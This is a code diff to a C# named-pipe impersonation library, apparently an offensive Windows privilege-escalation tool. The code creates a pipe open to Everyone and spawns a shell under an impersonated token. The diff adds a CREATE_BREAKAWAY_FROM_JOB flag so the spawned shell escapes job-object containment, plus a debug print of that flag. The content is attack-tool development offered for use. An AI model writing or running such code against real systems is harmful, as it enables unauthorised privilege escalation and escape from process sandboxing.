@@ -40,9 +40,15 @@ namespace NamedPipeImpersonation.Library
                     cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                     lpDesktop = @"Winsta0\Default"
                 };
+                var creationFlags = PROCESS_CREATION_FLAGS.NONE;
                 var pipeSecurity = new PipeSecurity();
                 var accessRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
                 pipeSecurity.AddAccessRule(accessRule);
+
+                if (Helpers.IsCurrentProcessInJob())
+                {
+                    creationFlags |= PROCESS_CREATION_FLAGS.CREATE_BREAKAWAY_FROM_JOB;
+                }
 
                 Globals.ConnectEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ConnectEvent");
                 Globals.PipeEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ServiceEvent");
@@ -185,7 +191,7 @@ namespace NamedPipeImpersonation.Library
                 }
 
                 Console.WriteLine("[>] Trying to spawn token assigned shell.");
-
+                Console.WriteLine(creationFlags.ToString());
                 status = NativeMethods.CreateProcessAsUser(
                     hPrimaryToken,
                     null,
@@ -193,7 +199,7 @@ namespace NamedPipeImpersonation.Library
                     IntPtr.Zero,
                     IntPtr.Zero,
                     false,
-                    PROCESS_CREATION_FLAGS.NONE,
+                    creationFlags,
                     IntPtr.Zero,
                     Environment.CurrentDirectory,
                     in startupInfo,
